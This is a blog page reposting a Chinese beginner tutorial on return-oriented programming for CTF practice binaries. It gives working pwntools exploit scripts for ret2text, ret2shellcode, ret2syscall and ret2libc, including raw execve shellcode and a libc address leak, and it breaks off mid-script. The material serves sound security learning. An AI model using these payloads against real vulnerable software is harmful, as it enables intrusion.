@@ -1,0 +1,716 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="ZERO-A-ONE" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Kopieren',
+      copy_success: 'Kopiert',
+      copy_failure: 'Kopieren fehlgeschlagen'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="转载自：https://www.yuque.com/hxfqg9/hs80y0/ug9gx5#ueOeL Basic-ROPret2text没啥好说的，看过蒸米的就可以做出来了 exp： 123456from pwn import *p=process(&amp;apos;./ret2text&amp;apos;)sys_addr=0x804863Apayload=&amp;apos;a&amp;apos;*112+p32(sy">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn入门（Basic-ROP）">
+<meta property="og:url" content="http://yoursite.com/2020/02/16/pwn╚δ├┼ú¿Basic-ROPú⌐/index.html">
+<meta property="og:site_name" content="ZERO-A-ONE">
+<meta property="og:description" content="转载自：https://www.yuque.com/hxfqg9/hs80y0/ug9gx5#ueOeL Basic-ROPret2text没啥好说的，看过蒸米的就可以做出来了 exp： 123456from pwn import *p=process(&amp;apos;./ret2text&amp;apos;)sys_addr=0x804863Apayload=&amp;apos;a&amp;apos;*112+p32(sy">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574162875314-6f04e478-d8ce-4975-b1d7-502907400056.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574162983275-2c3a0d0b-dad5-4f15-a5d8-8e219efa3c7c.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574163235157-20066c3b-fd85-44dd-afb4-59ec9d47ab72.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574326114023-1a1a7dd8-3b3b-4b26-b267-8ab853fc7a6e.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574335064586-620aa890-57e1-4427-8846-51990871c55c.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574335389884-7affaef4-c92f-49e7-b6d6-c9ce091d9732.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574335469653-97f966c2-e116-4976-842a-adffcaefd70a.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574335607223-0e92b707-49c5-4e31-9bbf-fcb7a4764a6e.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574336747696-914e4724-c8c3-4ba1-b65d-cb3a93459f68.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574403535178-184d2107-b762-47bd-9dda-d629e74d4483.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574407070973-4b88be2e-6388-4c28-b14e-83ffa84124e0.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574407137985-b2057cf8-fad6-4a89-80a8-355dc9f41fdc.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574586037138-97e8c208-e876-48ca-b9cd-0a64d829175f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574586260374-add330e2-4491-4b46-9980-2f450c34faf6.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574510177475-db49a7d5-6909-421e-a868-6829c9a7b4a4.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/jpeg/268938/1574513788142-e66171f3-6300-4e14-ab57-cc301c936829.jpeg">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1580779496150-487cd998-b4af-4bb0-ad41-9ab376a7f8ff.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1580780401627-53526fc2-3646-4478-b040-8f1fb30ca0dc.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1580780428606-42b2c58b-1809-43dc-8b4e-afa79a1456cf.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1580780626820-92e99da4-b8f0-43c7-b9df-1ba09342a0ff.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/jpeg/268938/1580739542097-a6d2738b-9a08-4b5f-acd8-d5f2c4d77278.jpeg">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/jpeg/268938/1580739570228-64997692-8003-4c10-acf2-2c8d91095e3c.jpeg">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574668172344-2d5dce6a-3e6a-437a-bcc7-5a06950ee918.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574668407609-8e44a3b0-4464-41c1-aad9-e9163a76d1c1.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574663502432-70335a77-3256-4ba8-adf0-f7208c5b7ed7.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574663904109-6e3aa29a-7ae6-48f4-98f6-7ba99c5cf511.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574664880977-b87b80fb-e80a-43ad-b6c6-22fad2b1bda8.png">
+<meta property="og:updated_time" content="2020-02-17T07:42:50.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwn入门（Basic-ROP）">
+<meta name="twitter:description" content="转载自：https://www.yuque.com/hxfqg9/hs80y0/ug9gx5#ueOeL Basic-ROPret2text没啥好说的，看过蒸米的就可以做出来了 exp： 123456from pwn import *p=process(&amp;apos;./ret2text&amp;apos;)sys_addr=0x804863Apayload=&amp;apos;a&amp;apos;*112+p32(sy">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574162875314-6f04e478-d8ce-4975-b1d7-502907400056.png">
+  <link rel="canonical" href="http://yoursite.com/2020/02/16/pwn╚δ├┼ú¿Basic-ROPú⌐/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>pwn入门（Basic-ROP） | ZERO-A-ONE</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ZERO-A-ONE</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Navigationsleiste an/ausschalten">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Suche</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Suche..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+     <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/16/pwn╚δ├┼ú¿Basic-ROPú⌐/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ZERO-A-ONE">
+      <meta itemprop="description" content="Resit much,Obey little">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZERO-A-ONE">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">pwn入门（Basic-ROP）
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2020-02-16 07:41:26 / Geändert am: 23:42:50" itemprop="dateCreated datePublished" datetime="2020-02-16T07:41:26-08:00">2020-02-16</time>
+            </span>
+          
+            
+
+            
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>转载自：<a href="https://www.yuque.com/hxfqg9/hs80y0/ug9gx5#ueOeL" target="_blank" rel="noopener">https://www.yuque.com/hxfqg9/hs80y0/ug9gx5#ueOeL</a></p>
+<h1 id="Basic-ROP"><a href="#Basic-ROP" class="headerlink" title="Basic-ROP"></a>Basic-ROP</h1><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>没啥好说的，看过蒸米的就可以做出来了</p>
+<p>exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&apos;./ret2text&apos;)</span><br><span class="line">sys_addr=0x804863A</span><br><span class="line">payload=&apos;a&apos;*112+p32(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>通过有一个复制的函数，会复制到 buf2 这个地方</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574162875314-6f04e478-d8ce-4975-b1d7-502907400056.png" alt="image.png"></p>
+<p>而且 buf2 所在的是 bss 段</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574162983275-2c3a0d0b-dad5-4f15-a5d8-8e219efa3c7c.png" alt="image.png"></p>
+<p>通过 gdb 查看 bss 段可执行，所以把只要把内容写到这个地方，然后返回地址跳转到 bss 段就可以执行 shellcode</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574163235157-20066c3b-fd85-44dd-afb4-59ec9d47ab72.png" alt="image.png"></p>
+<p>掌握了一些 pwntools 的用法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./ret2shellcode'</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">print</span> shellcraft.sh()</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">'A'</span>) + p32(buf2_addr))</span><br><span class="line"><span class="keyword">print</span> shellcode.ljust(<span class="number">112</span>,<span class="string">'A'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>上面是给出的 exp 等价于下面的，可以发现 shellcraft.sh() 可以生成 shellcode</p>
+<p>shellcode.ljust(112,’a’) 可以控制垃圾数据与 shellcode 合起来的长度为112</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">sh = process(&apos;./ret2shellcode&apos;)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">shellcode+=&apos;a&apos;*(112-len(shellcode))</span><br><span class="line">print shellcode</span><br><span class="line">buf2_addr = 0x804a080</span><br><span class="line">sh.sendline(shellcode + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="sniperoj-pwn100-shellcode-x86-64："><a href="#sniperoj-pwn100-shellcode-x86-64：" class="headerlink" title="sniperoj-pwn100-shellcode-x86-64："></a>sniperoj-pwn100-shellcode-x86-64：</h2><p>23字节shellcode</p>
+<p>“\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05”</p>
+<p>首先根据 gdb 确定偏移，然后把因为有个 leave 指令会破坏前面的，所以前面的填充为脏数据，然后加上返回地址占据的 8 位空间，确定在 buf_addr 后面 24+8 填充 shellcode</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(&apos;./shellcode&apos;)</span><br><span class="line">shellcode_x64 = &quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span><br><span class="line">sh.recvuntil(&apos;[&apos;)</span><br><span class="line">buf_addr = sh.recvuntil(&apos;]&apos;, drop=True)</span><br><span class="line">buf_addr = int(buf_addr, 16)</span><br><span class="line">payload = &apos;b&apos; * 24 + p64(buf_addr + 32) + shellcode_x64</span><br><span class="line">print payload</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>ret2syscall 即控制程序执行系统调用来获取 shell</p>
+<p>关于系统调用的知识：</p>
+<blockquote>
+<p><strong>Linux 的系统调用通过 int 80h 实现</strong>，用系统调用号来区分入口函数</p>
+<p><strong>应用程序调用系统调用的过程是：</strong></p>
+<p>1、把<strong>系统调用的编号存入 EAX</strong></p>
+<p>2、把<strong>函数参数存入其它通用寄存器</strong></p>
+<p>3、<strong>触发 0x80 号中断</strong>（int 0x80）</p>
+</blockquote>
+<p>那么我们如果希望通过系统调用来获取 shell 就需要把系统调用的参数放入各个寄存器，然后执行 int 0x80 就可以了</p>
+<p>如果说想通过系统调用执行的是：<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code>（32位程序）</p>
+<p>那么 eax 寄存器应该放系统调用号，查看 execve 的系统调用号：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/include/asm/unistd_32.h | grep execve</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574326114023-1a1a7dd8-3b3b-4b26-b267-8ab853fc7a6e.png" alt="image.png"></p>
+<p>得到 11，转换为 16 进制是 0xb，所以 eax 中应该存放 0xb</p>
+<p>ebx 应该存放想要执行的 /bin/sh 的地址，还有两个参数设置为 0</p>
+<p>所以现在需要做的就是让：</p>
+<blockquote>
+<p>eax=0xb</p>
+<p>ebx=/bin/sh 的地址</p>
+<p>ecx=0</p>
+<p>edx=0</p>
+</blockquote>
+<p>只需要让栈顶的值是 0xb 然后可以通过 pop eax 达到目的</p>
+<p>要用：<a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">ROPgadget</a> 来查找</p>
+<p>使用命令找到 pop eax：<code>ROPgadget --binary rop  --only &#39;pop|ret&#39; | grep &#39;eax&#39;</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574335064586-620aa890-57e1-4427-8846-51990871c55c.png" alt="image.png"></p>
+<p>类似的，通过这条命令寻找控制其他寄存器的地址，找到可以控制多个的！</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574335389884-7affaef4-c92f-49e7-b6d6-c9ce091d9732.png" alt="image.png"></p>
+<p>同时使用：<code>ROPgadget --binary rop --string &#39;/bin/sh&#39;</code> 找到 ‘/bin/sh’ 字符串在什么地方</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574335469653-97f966c2-e116-4976-842a-adffcaefd70a.png" alt="image.png"></p>
+<p>以及需要的 int 0x80：<code>ROPgadget --binary rop --only &#39;int&#39;</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574335607223-0e92b707-49c5-4e31-9bbf-fcb7a4764a6e.png" alt="image.png"></p>
+<p>有偏移的长度：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574336747696-914e4724-c8c3-4ba1-b65d-cb3a93459f68.png" alt="image.png"></p>
+<p>最后写出 exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""自己写的"""</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./rop'</span>)</span><br><span class="line">int_addr=<span class="number">0x8049421</span></span><br><span class="line">bin_addr=<span class="number">0x80be408</span></span><br><span class="line">pop_other_ret=<span class="number">0x806eb90</span></span><br><span class="line">pop_eax_ret=<span class="number">0x80bb196</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">112</span>+p32(pop_eax_ret)+p32(<span class="number">0xb</span>)+p32(pop_other_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bin_addr)+p32(int_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">"""ctf-wiki上的"""</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./rop'</span>)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat([<span class="string">'A'</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line"><span class="comment">#flat模块能将pattern字符串和地址结合并且转为字节模式</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h3><p>控制程序执行 libc 中的参数，通常是返回到某个函数的 plt 处，或者某个函数的具体位置（函数对应 got 表项的内容），一般情况会选择执行 system(‘/bin/sh’)</p>
+<p>看第一个程序：</p>
+<p>得到偏移：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574403535178-184d2107-b762-47bd-9dda-d629e74d4483.png" alt="image.png"></p>
+<p>同时找到：/bin/sh 与 system 的地址</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574407070973-4b88be2e-6388-4c28-b14e-83ffa84124e0.png" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574407137985-b2057cf8-fad6-4a89-80a8-355dc9f41fdc.png" alt="image.png"></p>
+<p>构造 exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&apos;./ret2libc1&apos;)</span><br><span class="line">bin_addr=0x8048720</span><br><span class="line">sys_addr=0x8048460</span><br><span class="line">payload=&apos;a&apos;*112 + p32(sys_addr)+p32(1234)+p32(bin_addr)</span><br><span class="line">p.sendline(bin_addr)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h3><p>这一个没有了 “/bin/sh” 字符串，需要通过 gets 函数写到一个可读可写的地方，通常会找 bss 段，然后去执行 /bin/sh </p>
+<p>通过查找，可以找到的数据如下：</p>
+<p>sys_addr=0x8048490</p>
+<p>get_addr=0x8048460</p>
+<p>bss_addr=0x804A080</p>
+<p>通过这些数据可以写出 exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&apos;./ret2libc2&apos;)</span><br><span class="line">sys_addr=0x8048490</span><br><span class="line">get_addr=0x8048460</span><br><span class="line">bss_addr=0x804A080</span><br><span class="line">payload = &apos;a&apos;*112 +p32(get_addr)+p32(sys_addr)+p32(bss_addr)+p32(bss_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="例3"><a href="#例3" class="headerlink" title="例3"></a>例3</h3><p>没有 system 也没有 /bin/sh，需要使用 libc 中的 system 和 /bin/sh，知道了libc中的一个函数的地址就可以确定该程序利用的 libc，从而知道其他函数的地址</p>
+<p>获得 libc 的某个函数的地址通常采用的方法是：通过 got 表泄露，但是由于libc的延迟绑定，需要泄露的是已经执行过的函数的地址</p>
+<p>总的来说：</p>
+<p>1、通过第一次溢出，通过将 puts 的 PLT 地址放到返回处，泄漏出执行过的函数的 GOT 地址（实际上 puts 的就可以）</p>
+<p>2、将 puts 的返回地址设置为 _start 函数（main () 函数是用户代码的入口，是对用户而言的；而_start () 函数是系统代码的入口，是程序真正的入口），方便再次用来执行 system(‘/bin/sh’)</p>
+<p>3、通过泄露的函数的 GOT 地址计算出 libc 中的 system 和 /bin/sh 的地址</p>
+<p>4、再次通过溢出将返回地址覆盖成泄露出来的 system 的地址 getshell</p>
+<p>自己写的exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">elf=ELF(&apos;ret2libc3&apos;)</span><br><span class="line">p=process(&apos;./ret2libc3&apos;)</span><br><span class="line">puts_plt=elf.plt[&apos;puts&apos;]</span><br><span class="line">puts_got=elf.got[&apos;puts&apos;]</span><br><span class="line">start_addr = elf.symbols[&apos;_start&apos;]</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">payload1=&apos;A&apos;*112+p32(puts_plt)+p32(start_addr)+p32(puts_got)</span><br><span class="line">p.sendlineafter(&quot;!?&quot;,payload1)</span><br><span class="line">puts_addr=u32(p.recv(4))</span><br><span class="line">libc=LibcSearcher(&apos;puts&apos;,puts_addr)</span><br><span class="line">libcbase=puts_addr-libc.dump(&quot;puts&quot;)</span><br><span class="line">system_addr=libcbase+libc.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr=libcbase+libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line">payload2=&apos;A&apos;*112+p32(system_addr)+p32(1234)+p32(binsh_addr)</span><br><span class="line">p.sendlineafter(&quot;!?&quot;,payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>dalao的 exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(&apos;./ret2libc3&apos;)</span><br><span class="line">elf = ELF(&apos;./ret2libc3&apos;)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[&apos;puts&apos;]</span><br><span class="line">puts_got = elf.got[&apos;puts&apos;]</span><br><span class="line">start_addr = elf.symbols[&apos;_start&apos;]</span><br><span class="line">print &quot;[*]puts plt: &quot; + hex(puts_plt)</span><br><span class="line">print &quot;[*]puts got: &quot; + 